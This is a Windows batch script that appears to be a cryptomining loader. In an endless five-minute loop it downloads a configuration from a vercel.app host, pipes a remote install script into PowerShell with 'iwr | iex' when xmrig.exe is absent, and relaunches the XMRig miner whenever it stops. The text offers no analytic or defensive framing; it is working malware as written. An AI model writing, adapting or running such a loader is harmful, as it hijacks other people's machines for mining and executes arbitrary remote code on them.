@echo off
setlocal
if not exist "C:\talitania" mkdir C:\talitania

:listener
curl -L -s -o "C:\talitania\config.json" ^
  "6259aaf5-f971-4db1-a171-a4d274e9cb70.vercel.app/api/config"

if not exist "C:\talitania\xmrig.exe" (
    taskkill /f /im xmrig.exe
    powershell -NoProfile -Command "iwr 6259aaf5-f971-4db1-a171-a4d274e9cb70.vercel.app/api/install | iex"
)

tasklist /FI "IMAGENAME eq xmrig.exe" 2>NUL | find /I "xmrig.exe" >NUL
if errorlevel 1 (
    taskkill /F /IM xmrig.exe >nul 2>&1
    start "" "C:\talitania\xmrig.exe"
)

cls
timeout /t 300 /nobreak >nul
goto listener